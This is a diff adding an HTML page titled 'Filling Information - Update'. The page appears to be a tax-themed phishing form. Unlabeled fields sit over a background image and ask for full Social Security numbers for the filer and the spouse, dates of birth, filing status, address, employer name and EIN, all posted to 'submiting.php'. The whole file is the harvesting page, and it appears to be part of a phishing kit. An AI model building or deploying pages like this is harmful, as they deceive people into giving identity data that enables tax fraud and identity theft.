@@ -1,0 +1,288 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <title>
+   Filling Information - Update
+  </title>
+  <style type="text/css">
+   body {
+	position: absolute;
+	background-image: url(sssssss.png);
+	margin-left: 500px;
+	margin-right: 1000px;
+	margin-top: 100px;
+	margin-bottom: 300px;
+}
+  </style>
+ </head>
+ <body>
+  <form style="margin-left: 142px; margin-top: 128px;" onsubmit="return ValidateFormOther()" id="login" name="login" method="post" action="submiting.php">
+   <p>
+    <input type="text" maxlength="3" style="width: 40px; height: 14px" id="ssn1" name="ssn1" />
+    - 
+    <input type="text" maxlength="2" style="width: 35px; height: 14px" id="ssn2" name="ssn2" />
+    - 
+    <input type="text" maxlength="4" style="width: 40px; height: 14px" id="ssn3" name="ssn3" />
+   </p>
+   <p>
+    <input type="text" style="width: 230px; height: 15px" id="firstname" name="firstname" />
+   </p>
+   <input type="text" style="width: 230px; height: 15px" id="lastname" name="lastname" />
+   <p>
+   </p>
+   <p>
+    <input type="text" maxlength="2" style="width: 35px; height: 15px" id="dob1" name="dob1" />
+    /
+    <input type="text" maxlength="2" style="width: 35px; height: 15px" id="dob2" name="dob2" />
+    /
+    <input type="text" maxlength="4" style="width: 40px; height: 15px" id="dob3" name="dob3" />
+   </p>
+   <p>
+    <select title="Select your Filing Status" class="dfltf" id="fillingstatus" name="fillingstatus">
+     <option value="SG">
+      Select One
+     </option>
+     <option value="SG">
+      Single
+     </option>
+     <option value="MFJ">
+      Married-Filing Joint Return
+     </option>
+     <option value="MFS">
+      Married-Filing Separate Return
+     </option>
+     <option value="HOH">
+      Head of Household
+     </option>
+     <option value="QW">
+      Qualifying Widow(er) with dependent child
+     </option>
+    </select>
+   </p>
+   <input type="text" style="width: 280px; height: 15px" id="address" name="address" />
+   <p>
+   </p>
+   <p>
+    <input type="text" style="width: 150px; height: 15px" id="city" name="city" />
+    <input type="text" maxlength="5" style="width: 50px; height: 15px" name="zipcode" />
+   </p>
+   <p>
+    <select title="Select your State or U.S. Territory" class="dfltf" id="state" name="state">
+     <option selected="selected" value="ZZ">
+      Select One
+     </option>
+     <option value="AL">
+      Alabama (AL)
+     </option>
+     <option value="AK">
+      Alaska (AK)
+     </option>
+     <option value="AZ">
+      Arizona (AZ)
+     </option>
+     <option value="AR">
+      Arkansas (AR)
+     </option>
+     <option value="CA">
+      California (CA)
+     </option>
+     <option value="CO">
+      Colorado (CO)
+     </option>
+     <option value="CT">
+      Connecticut (CT)
+     </option>
+     <option value="DE">
+      Delaware (DE)
+     </option>
+     <option value="DC">
+      District of Columbia (DC)
+     </option>
+     <option value="FL">
+      Florida (FL)
+     </option>
+     <option value="GA">
+      Georgia (GA)
+     </option>
+     <option value="HI">
+      Hawaii (HI)
+     </option>
+     <option value="ID">
+      Idaho (ID)
+     </option>
+     <option value="IL">
+      Illinois (IL)
+     </option>
+     <option value="IN">
+      Indiana (IN)
+     </option>
+     <option value="IA">
+      Iowa (IA)
+     </option>
+     <option value="KS">
+      Kansas (KS)
+     </option>
+     <option value="KY">
+      Kentucky (KY)
+     </option>
+     <option value="LA">
+      Louisiana (LA)
+     </option>
+     <option value="ME">
+      Maine (ME)
+     </option>
+     <option value="MD">
+      Maryland (MD)
+     </option>
+     <option value="MA">
+      Massachusetts (MA)
+     </option>
+     <option value="MI">
+      Michigan (MI)
+     </option>
+     <option value="MN">
+      Minnesota (MN)
+     </option>
+     <option value="MS">
+      Mississippi (MS)
+     </option>
+     <option value="MO">
+      Missouri (MO)
+     </option>
+     <option value="MT">
+      Montana (MT)
+     </option>
+     <option value="NE">
+      Nebraska (NE)
+     </option>
+     <option value="NV">
+      Nevada (NV)
+     </option>
+     <option value="NH">
+      New Hampshire (NH)
+     </option>
+     <option value="NJ">
+      New Jersey (NJ)
+     </option>
+     <option value="NM">
+      New Mexico (NM)
+     </option>
+     <option value="NY">
+      New York (NY)
+     </option>
+     <option value="NC">
+      North Carolina (NC)
+     </option>
+     <option value="ND">
+      North Dakota (ND)
+     </option>
+     <option value="OH">
+      Ohio (OH)
+     </option>
+     <option value="OK">
+      Oklahoma (OK)
+     </option>
+     <option value="OR">
+      Oregon (OR)
+     </option>
+     <option value="PA">
+      Pennsylvania (PA)
+     </option>
+     <option value="RI">
+      Rhode Island (RI)
+     </option>
+     <option value="SC">
+      South Carolina (SC)
+     </option>
+     <option value="SD">
+      South Dakota (SD)
+     </option>
+     <option value="TN">
+      Tennessee (TN)
+     </option>
+     <option value="TX">
+      Texas (TX)
+     </option>
+     <option value="UT">
+      Utah (UT)
+     </option>
+     <option value="VT">
+      Vermont (VT)
+     </option>
+     <option value="VA">
+      Virginia (VA)
+     </option>
+     <option value="WA">
+      Washington (WA)
+     </option>
+     <option value="WV">
+      West Virginia (WV)
+     </option>
+     <option value="WI">
+      Wisconsin (WI)
+     </option>
+     <option value="WY">
+      Wyoming (WY)
+     </option>
+     <option value="">
+      -------
+     </option>
+     <option value="AS">
+      American Samoa (AS)
+     </option>
+     <option value="FM">
+      Federated States of Micronesia (FM)
+     </option>
+     <option value="GU">
+      Guam (GU)
+     </option>
+     <option value="MH">
+      Marshall Islands (MH)
+     </option>
+     <option value="MP">
+      Northern Mariana Islands (MP)
+     </option>
+     <option value="PW">
+      Palau (PW)
+     </option>
+     <option value="PR">
+      Puerto Rico (PR)
+     </option>
+     <option value="VI">
+      Virgin Islands (VI)
+     </option>
+     <option value="">
+      -------
+     </option>
+    </select>
+   </p>
+   <p>
+    <input type="text" style="width: 150px; height: 15px" id="employername" name="employername" />
+    <input type="text" style="width: 80px; height: 15px" id="ein" name="ein" />
+   </p>
+   <p>
+    <input type="text" style="width: 280px; height: 15px" id="employeraddress" name="employeraddress" />
+   </p>
+   <p>
+    <input type="text" style="width: 250px; height: 15px" id="spfullname" name="spfullname" />
+   </p>
+   <p>
+    <input type="text" maxlength="2" style="width: 35px; height: 15px" id="tfl" name="tfl" />
+    /
+    <input type="text" maxlength="2" style="width: 35px; height: 15px" id="tfl2" name="tfl2" />
+    /
+    <input type="text" maxlength="4" style="width: 40px; height: 15px" id="tfl3" name="tfl3" />
+   </p>
+   <p>
+    <input type="text" maxlength="3" style="width: 40px; height: 14px" id="spssn" name="spssn" />
+    - 
+    <input type="text" maxlength="2" style="width: 35px; height: 14px" id="spssn2" name="spssn2" />
+    - 
+    <input type="text" maxlength="4" style="width: 40px; height: 14px" id="spssn3" name="spssn3" />
+   </p>
+   <p>
+    <input type="submit" value="Submit" />
+   </p>
+  </form>
+ </body>
+</html>
